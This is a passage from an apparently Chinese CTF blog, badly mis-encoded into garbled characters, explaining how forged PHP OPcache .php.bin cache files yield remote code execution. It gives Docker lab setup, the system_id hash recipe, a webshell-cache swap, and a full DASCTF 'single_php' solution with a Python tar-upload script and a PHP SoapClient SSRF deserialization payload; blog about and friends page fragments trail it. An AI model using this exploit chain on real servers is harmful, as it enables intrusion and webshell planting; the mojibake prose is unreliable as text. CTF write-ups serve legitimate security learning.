è„šæœ¬çš„å¼€é”€ï¼Œè§£æå™¨å¯ä»¥ç›´æ¥ä»å…±äº«å†…å­˜è¯»å–å·²ç»ç¼“å­˜è¿‡çš„å­—èŠ‚ç ï¼Œä»è€Œå¤§å¤§æé«˜äº† PHP çš„æ‰§è¡Œæ•ˆç‡ã€‚ PHPçš„æ­£å¸¸æ‰§è¡Œæµç¨‹ï¼š requestè¯·æ±‚(nginx,apache,cliç­‰) Zendå¼•æ“è¯»å–.phpæ–‡ä»¶ æ‰«æå…¶å­—å…¸å’Œè¡¨è¾¾å¼ è§£ææ–‡ä»¶ åˆ›å»ºè¦æ‰§è¡Œçš„è®¡ç®—æœºä»£ç (æˆä¸ºOpcode) æœ€åæ‰§è¡ŒOpcode responseè¿”å› æ¯ä¸€æ¬¡æ‰§è¡Œ PHP éƒ½è¦æ‰§è¡Œä¸€éä¸Šé¢çš„æ­¥éª¤ï¼Œå¦‚æœ PHP æºç æ²¡æœ‰å˜åŒ–ï¼Œé‚£ä¹ˆ OPcode ä¹Ÿä¸ä¼šå˜åŒ–ï¼Œæ˜¾ç„¶æ²¡æœ‰å¿…è¦ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨ OPcache ä¹‹å é¿å…é‡ç»„ç¼–è¯‘ å‡å°‘CPUå’Œå†…å­˜å¼€é”€ é…ç½®è§£è¯» 1234567891011file_cache_only = 0//PHP7 çš„é»˜è®¤å€¼ä¸º 0ï¼Œè¡¨ç¤ºå†…å­˜ç¼“å­˜æ–¹å¼çš„ä¼˜å…ˆçº§é«˜äºæ–‡ä»¶ç¼“å­˜ï¼Œé‚£ä¹ˆé‡å†™åçš„ OPcache æ–‡ä»¶(webshell)æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚ä½†æ˜¯ï¼Œå½“ Web æœåŠ¡å™¨é‡å¯åï¼Œå°±å¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚å› ä¸ºï¼ŒæœåŠ¡å™¨é‡å¯ä¹‹åï¼Œå†…å­˜çš„ç¼“å­˜ä¸ºç©ºï¼Œæ­¤æ—¶ï¼ŒOPcache ä¼šä½¿ç”¨æ–‡ä»¶ç¼“å­˜çš„æ•°æ®å¡«å……å†…å­˜ç¼“å­˜çš„æ•°æ®ï¼Œè¿™æ ·ï¼Œwebshell å°±å¯ä»¥æ‰§è¡Œäº†ã€‚opcache.validate_timestamps=0//PHP7 çš„é»˜è®¤å€¼ä¸º 1ï¼Œè¡¨ç¤ºå¯ç”¨äº†æ—¶é—´æˆ³æ ¡éªŒï¼ŒOPcache ä¼šå°†è¢«è¯·æ±‚è®¿é—®çš„ PHP æºæ–‡ä»¶çš„æ—¶é—´æˆ³ä¸å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶çš„æ—¶é—´æˆ³è¿›è¡Œæ ¡éªŒã€‚å¦‚æœä¸¤ä¸ªæ—¶é—´æˆ³ä¸åŒ¹é…ï¼Œç¼“å­˜æ–‡ä»¶å°†è¢«ä¸¢å¼ƒï¼Œå¹¶ä¸”é‡æ–°ç”Ÿæˆä¸€ä»½æ–°çš„ç¼“å­˜æ–‡ä»¶ã€‚æƒ³è¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæ”»å‡»è€…å¿…é¡»çŸ¥é“ç›®æ ‡æºæ–‡ä»¶çš„æ—¶é—´æˆ³ï¼Œå› æ­¤å¯ä»¥å…ˆè·å–åˆ° bin æ–‡ä»¶ï¼Œæ‹¿åˆ°æ—¶é—´æˆ³ï¼Œç„¶åå°†æˆ‘ä»¬çš„æ¶æ„ bin æ–‡ä»¶çš„æ—¶é—´æˆ³æ›¿æ¢å³å¯opcache.file_cache=/tmp//å¼€å¯Opcache File Cache(å®éªŒæ€§), é€šè¿‡å¼€å¯è¿™ä¸ª, æˆ‘ä»¬å¯ä»¥è®©OpcacheæŠŠopcodeç¼“å­˜ç¼“å­˜åˆ°å¤–éƒ¨æ–‡ä»¶ä¸­, å¯¹äºä¸€äº›è„šæœ¬, ä¼šæœ‰å¾ˆæ˜æ˜¾çš„æ€§èƒ½æå‡.è¿™æ ·PHPå°±ä¼šåœ¨ /tmp ç›®å½•ä¸‹ Cache ä¸€äº› Opcode çš„äºŒè¿›åˆ¶å¯¼å‡ºæ–‡ä»¶, å¯ä»¥è·¨ PHP ç”Ÿå‘½å‘¨æœŸå­˜åœ¨. ç¯å¢ƒæ­å»º123456789101112131415161718192021222324252627docker pull php:7.1-apache//docker pull php:8.2-apachedocker run -d -p 9000:80 --name opcache7 php:7.1-apache//docker run -d -p 9001:80 --name opcache8 php:8.2-apacheapt-get updateapt install vimvim phpinfo.php //å†™phpinfo//å®‰è£…opcacheæ’ä»¶docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcachevim /usr/local/etc/php/php.ini-production//æ‰¾åˆ°opcacheéƒ¨åˆ†æ·»åŠ ä¸‹é¢ä¸‰è¡Œå¥å­(å¦‚æœæˆ‘æ²¡è®°é”™çš„è¯åœ¨ 1798 è¡Œ/8æ˜¯1784):cry:[opcache]opcache.enable=1opcache.file_cache=&quot;/tmp&quot;opcache.file_cache_only=1//dockerçš„phpæ˜¯æ²¡æœ‰php.inié…ç½®æ–‡ä»¶çš„ï¼Œä¿®æ”¹äº†php.ini-productionåå¤åˆ¶å¹¶é‡å‘½åä¸ºphp.iniå³å¯cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini//ä¿®æ”¹äº†php.iniè¦é‡å¯æœåŠ¡service apache2 reload çœ‹åˆ°è¿™ä¸€è¡Œå°±è¯´æ˜é…ç½®æˆåŠŸäº† å†çœ‹ä¸€ä¸‹ docker ä¸­çš„æ–‡ä»¶ å½“Opcacheç¬¬ä¸€æ¬¡ç¼“å­˜æ–‡ä»¶æ—¶ï¼Œ /tmp/system_id/var/www/html/phpinfo.php.bin OPcache-PHP7Opcache rceçš„åŸç† Opache æ˜¯ php ä¸­ä¸€ä¸ªç”Ÿæˆç¼“å­˜æ–‡ä»¶çš„æ‹“å±•ï¼Œå½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ª php æ–‡ä»¶æ—¶ï¼Œä»–ä¼šäº§ç”Ÿä¸€ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä¸‹æ¬¡è®¿é—®è¯¥ php æ–‡ä»¶æ—¶ï¼Œå°±æ˜¯ç›´æ¥æ ¹æ®ç¼“å­˜æ–‡ä»¶å›æ˜¾é¡µé¢äº†ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ä¼ªé€ æ–‡ä»¶æ›¿æ¢å³å¯ ç¼“å­˜æ–‡ä»¶å¤¹ä¸º1116d566fdc53f79abce6c01e3a0308dè®¡ç®—&#96;&#96;system_id&#96;æ˜¯ä»Šå¤©çš„é‡ç‚¹ å¯ä»¥æ ¹æ®phpinfoçš„ä¿¡æ¯è®¡ç®—å‡ºæ¥system_idçš„ åœ¨ PHP ç¯å¢ƒä¸‹å·²ç»æœ‰å‰äººç»™å‡ºæˆ‘ä»¬è®¡ç®—è„šæœ¬ï¼Œhttps://github.com/GoSecure/php7-opcache-override æ¥ä¸‹æ¥ï¼Œå½“æˆ‘ä»¬å­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥æˆ–è€…è¦†ç›–æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–.php.binæ–‡ä»¶è¾¾åˆ°RCEçš„ç›®çš„ æŠŠæ–‡ä»¶æä¸‹æ¥ï¼Œåˆ†æä¸€ä¸‹ â€‹\tå¯ä»¥çœ‹åˆ°æœ€å¼€å¤´æ˜¯OPACHE+systemidï¼Œå› æ­¤å‡å¦‚æˆ‘ä»¬è·å–åˆ°äº†SYSTEMIDï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ä¸€ä»½ç¼“å­˜æ–‡ä»¶äº†ï¼Œä½†æ˜¯è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ æˆ‘ä»¬è¿™é‡Œçš„opacheæ‹“å±•å¼€å¯äº†timestampï¼Œä¹Ÿå°±æ˜¯æ—¶é—´æˆ³éªŒè¯ï¼Œé‚£ä¹ˆå‡å¦‚æˆ‘ä»¬åˆ›å»ºçš„æ–‡ä»¶æ—¶é—´æˆ³ä¸å¯¹çš„è¯ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•è¦†ç›–æˆåŠŸçš„ï¼Œé‚£ä¹ˆå°±éœ€è¦é¢˜ç›®æœ‰ä¸€ä¸ªè·å–æ—¶é—´çš„åœ°æ–¹ï¼Œå‡å¦‚å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶æˆ–è€…ç›´æ¥è·å–æ—¶é—´æˆ³ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨010editorç›´æ¥ä¿®æ”¹ã€‚ å›¾ä¸­è“è‰²ä»£è¡¨çš„å°±æ˜¯æ—¶é—´æˆ³äº†ã€‚æˆ‘ä»¬è®°ä½è¿™ä¸ªæ—¶é—´æˆ³ï¼Œç„¶åæˆ‘ä»¬åŒæ ·å»è‡ªå·±çš„æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„ç¼“å­˜binæ–‡ä»¶ï¼š ç„¶åæ›¿æ¢æ‰è¿™ä¸ªæ–‡ä»¶ã€‚ç„¶åè®¿é—® phpinfo.php çœ‹çœ‹æ•ˆæœï¼š è¿™æ ·å°±æˆåŠŸgetshelläº†ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ç”Ÿæˆæ¶æ„binæ–‡ä»¶çš„phpç‰ˆæœ¬éœ€è¦å¤§è‡´å»åˆï¼Œä¸èƒ½å·®å¤ªå¤šã€‚ Opcache-PHP8åœ¨PHP8ä¹‹åï¼Œopcacheç”Ÿæˆsystem_idçš„æ–¹æ³•æœ‰äº›è®¸æ”¹å˜ï¼Œæ‰€ä»¥ä¹‹å‰çš„è„šæœ¬æ˜¯è·‘ä¸å‡ºæ¥äº† å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„ system_id ä¸åŒ è¿™é‡Œçš„è§„å¾‹ä½¬è¯´åŠ¨è°ƒå¯ä»¥çœ‹å‡ºæ¥æ˜¯php ç‰ˆæœ¬å· + API 12&lt;?phpvar_dump(md5(&quot;8.2.15API420220829,NTSBIN_4888(size_t)8\\002&quot;)); æœ€åç®—å‡ºæ¥çš„ä¸€æ · æ¥ä¸‹æ¥çš„è·Ÿ PHP7 æ²¡åŒºåˆ«äº†å°± DASCTF X 0psu3 åä¸€æœˆæŒ‘æˆ˜èµ› single_phpé€šè¿‡ highlight_file é«˜äº®ä»£ç è·å¾—å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; img &#123; max-width: 200px; max-height: 200px; &#125; &lt;/style&gt; &lt;title&gt;revenge to siranai.php &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h5&gt; This is my wife.She is from Imagination. And I,use her name as my id. &lt;/h5&gt; &lt;img src=&quot;mywife.png&quot; alt=&quot;this is my wife&quot;&gt; &lt;p&gt;I have been single dog for 19 years.&lt;br&gt; One day, my brothers betrayed the singles organization.&lt;br&gt; S* and B* ,both of them have the kanozyo.&lt;br&gt; Now revenge to them!!!!!&lt;br&gt; use &#x27;$_GET[&#x27;LuckyE&#x27;](__FILE__);&#x27; to begin your revenge!!&lt;br&gt; &lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php error_reporting(0); class siroha&#123; public $koi; public function __destruct()&#123; $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;](); &#125; &#125; $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__); var_dump($kanozyo); $suki = unserialize($_POST[&#x27;suki&#x27;]); siranai.php å­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯åªèƒ½æ‰§è¡Œä¸€ä¸ªæ— å‚çš„å‡½æ•°ï¼Œä¾‹å¦‚phpinfo() 1234567&lt;?phpclass siroha&#123; public $koi = array(&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;);&#125;$a = new siroha();echo serialize($a); ååºåˆ—åŒ–è°ƒç”¨æŸ¥çœ‹ phpinfo ç›¸å…³ä¿¡æ¯ é¦–å…ˆ OPcache å¼€å¯å¹¶ä¸”ç¼“å­˜æ–‡ä»¶åœ¨ &#x2F;tmp ç›®å½•ä¸‹ ç„¶åéœ€è¦æ³¨æ„çš„æ˜¯æ—¶é—´æˆ³æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥è¦åŠæ³•è¯»æ—¶é—´æˆ³ filemtimeâ€”â€” å–å¾—æ–‡ä»¶ä¿®æ”¹æ—¶é—´ è·å–æ—¶é—´æˆ³(å®˜æ–¹wpæ˜¯è„šæœ¬è¯»çš„) æ¥ç€åˆ†æä¸€ä¸‹ siranai.php çš„ä»£ç  1234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);$allowed_ip = &quot;127.0.0.1&quot;;if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] !== $allowed_ip) &#123; die(&quot;S* has the kanojo but you don&#x27;t&quot;);&#125; $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/x-tar&#x27;)&#123; exec(&#x27;cd /tmp &amp;&amp; tar -xvf &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); &#125; å‘ç°ä¸Šä¼ çš„æ–‡ä»¶ä¼šåœ¨/tmpç›®å½•ä¸‹è§£å‹ï¼Œä½†æ˜¯é™åˆ¶äº†è®¿é—®ipä¸º127.0.0.1ï¼Œéœ€è¦SSRF é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„å¯å˜å‡½æ•°è°ƒç”¨åˆ°__call()æ–¹æ³•ï¼Œè§¦å‘SoapClientç±»çš„SSRFä¸Šä¼ å‹ç¼©åŒ…ï¼Œè§£å‹åˆ°/tmp/[system_id]/var/www/html/index.php.binå®ç°RCE 1. æ„é€ æ¶æ„çš„index.phpbin æ–‡ä»¶ä¿®æ”¹system_id + æ—¶é—´æˆ³ 2. åˆ›å»ºtarå‹ç¼©åŒ… + ååºåˆ—åŒ–å®ç°POSTè¯·æ±‚è¿™é‡Œé€šè¿‡pythonè¯·æ±‚è·å–åˆ°å‹ç¼©åŒ…ä¸Šä¼ çš„æŠ¥æ–‡ ç›´æ¥è´´ä¸Šå®˜æ–¹WPé‡Œçš„pythonè„šæœ¬ 12345678910111213141516171819202122232425import hashlibimport tarfileimport requestssys_id = hashlib.md5(&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\\002&quot;.encode(&quot;utf-8&quot;)).hexdigest()def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;)def upload(): file = &#123;&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)&#125; res = requests.post(url=&quot;http://78bc1e89-1ea7-4655-8f23-5c452dc6ae17.node5.buuoj.cn:81/&quot;,files=file) print(res.request.headers) return res.requesttar_file()request_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)print(upload_body) å°†ç”Ÿæˆçš„è¯·æ±‚ä½“æ•°æ®å°è£…åœ¨ SoapClient å†…ç½®ç±»é‡Œï¼Œåºåˆ—åŒ– 12345678910&lt;?phpclass siroha&#123; public $koi;&#125;$postdata = &quot;&quot;;$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;, &#x27;user_agent&#x27; =&gt; &quot;aaa\\r &quot; . &quot;Cookie: PHPSESSION=aaa\\r Content-Type: multipart/form-data; boundary=&quot;.substr($postdata,2,32).&quot;\\r Connection: keep-alive\\r Accept: */*\\r Content-Length: 10416&quot;.&quot;\\r \\r &quot;.$postdata,&#x27;uri&#x27; =&gt; &quot;aaa&quot;));$b = new siroha();$b-&gt;koi=[&quot;zhanjiangdiyishenqing&quot;=&gt;[$a,&quot;nnnnn&quot;]];echo urlencode(serialize($b)); æœ€åsukiååºåˆ—åŒ–å³å¯ï¼Œæ³¨æ„è¿™é‡ŒåŒæ—¶éœ€è¦GETä¼ å‚ï¼Œæ»¡è¶³var_dump($kanozyo);ä¸æŠ¥é”™ è¿™é‡Œè°ƒç”¨ SoapClient å¯¹è±¡çš„ä¸å­˜åœ¨çš„nnnnnæ–¹æ³•ï¼Œä¼šè§¦å‘callæ–¹æ³•ã€‚burpå‘åŒ… æˆåŠŸ getshell å‚è€ƒï¼š [PHP8 OPCACHEç¼“å­˜æ–‡ä»¶å¯¼è‡´RCE - Boogiepop Doesnâ€™t Laugh (boogipop.com)](https://boogipop.com/2023/06/16/PHP8 OPCACHEç¼“å­˜æ–‡ä»¶å¯¼è‡´RCE&#x2F;) php Opcacheæ’ä»¶è¿›è¡ŒRCE - Zer0peach canâ€™t think Nepnepæˆ˜é˜Ÿåˆ†äº«ä¼š-20:08 CTFï¼š æ˜¥ç§‹æ¯2023-php_again ASIS CTF 2016 - BinaryCloud - Web Challenge â€“ ctf.rip ctfs&#x2F;alictf-2016&#x2F;homework at master Â· tothi&#x2F;ctfs Â· GitHub"},{"path":"/about/index.html","content":"Hi,this is Mi4tä¸€äº›éå¸¸é€šé€çš„è‡ªæˆ‘è®¤çŸ¥æ ‡ç­¾ï¼š æ‡’ç™Œæ™šæœŸéå¸¸éå¸¸æ™šæœŸï¼ˆæ²¡æ•‘äº†ï¼‰ ä¸€ä¸ªéå¸¸éå¸¸èœçš„webæ‰‹ï¼ˆæ‰¿è’™é˜Ÿå‹ä¸å«Œå¼ƒï¼Œæ¬¡æ¬¡å¸¦æˆ‘é£ï¼‰ ctferï¼ˆè¿™è¾ˆå­ç®—æ˜¯æ¯åœ¨CTFèº«ä¸Šäº†ï¼Œæˆ‘è¿˜æ²¡å¤ä¹ æœŸæœ«:cry:ï¼‰ srcèŒæ–°ï¼ŒèŒçš„ä¸èƒ½å†èŒï¼ˆæŒ–æ´åˆ°åº•æ˜¯ä»€ä¹ˆæ„Ÿè§‰.jpgï¼‰ åœ¨å­¦é•¿å­¦å§çš„å¸¦é¢†ä¸‹å¯¹ç½‘ç»œå®‰å…¨äº§ç”Ÿäº†æµ“åšçš„å…´è¶£ï¼ˆæ®Šä¸çŸ¥ä¸€å…¥ç½‘å®‰æ·±ä¼¼æµ·bushiï¼‰ï¼Œæ­å»ºåšå®¢çš„ç›®çš„ä¹Ÿæ˜¯å‚¬ä¿ƒè‡ªå·±å»å­¦ä¹ æ€è€ƒï¼ˆæ— å¥ˆå®åœ¨å¤ªæ‡’äº†ï¼Œæ­äº†è¿™ä¹ˆä¹…ï¼‰ï¼Œç¥æ„¿è‡ªå·±ä¸ä¼šæ–­æ›´ ä½œä¸ºä¸€ä¸ªctferï¼ˆè‡ªå°çš„ï¼‰ï¼Œæ€ä¹ˆèƒ½æ²¡æœ‰è‡ªå·±çš„flagå‘¢ï¼ O1 2024å¹´çš„å¤§å¤§ç›®æ ‡ï¼šåŠªåŠ›å‘å¤§ä½¬çœ‹é½ æ¥è‡ª2025å¹´çš„ç¥æ„¿ï¼šå¸Œæœ›èƒ½åŸºæœ¬å®ç°ç›®æ ‡ æ­£å¸¸ 21% KR1 - ç¬¬ä¸€æ­¥å…ˆçœ‹å®Œé‚£ä¸‰æœ¬ä¹¦ï¼ˆé¡ºå¸¦ç€æ“ä½œï¼‰ èƒ½ç»™æˆ‘å®è·µçš„æœºä¼šå—ï¼Ÿ æ­£å¸¸ 10% KR2 ç¨³å›ºå¤–ç½‘æ¼æ´ top10çš„å¤ä¹  äº¦æˆ–è€…èƒ½ç»™ä¸€ä¸ªæŒ–SRCçš„æœºä¼šå— æ­£å¸¸ 10% KR3 å°è¯•å»å¼€å‘ä¸€äº›ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿ æ¯”å¦‚è¯´å…ˆç»™å¤§åˆ›æ•´äº† æ­£å¸¸ 12% KR4 Othersï¼Ÿï¼Ÿ å¤©å¤©å¼€å¿ƒæœ€é‡è¦ æ­£å¸¸ 50%"},{"title":"daily","path":"/daily/index.html","content":"åç»­ä¼šåœ¨è¿™é‡Œæä¸€äº›æ—¥å¸¸ï¼ˆå…¶å®ä¹Ÿå°±æ˜¯ç‰¢éªšï¼‰ï¼Œå‘ç°memosè¦æ­åœ¨å…¬ç½‘ä¸Šï¼ˆå¹¶ä¸æƒ³ï¼‰ï¼Œè®©æˆ‘å…ˆç ”ç©¶ç ”ç©¶ï¼ˆå®åœ¨ä¸è¡Œæ•´ä¸ªé™æ€çš„ï¼‰ï¼Œå¸Œæœ›ä¸ä¼šé¸½å¤ªä¹…ï¼Œå¤ªå¿™äº†ã€‚ã€‚"},{"title":"fridens","path":"/friends/index.html","content":"inf_PopaywğŸ­bananashipsğŸŒ"}]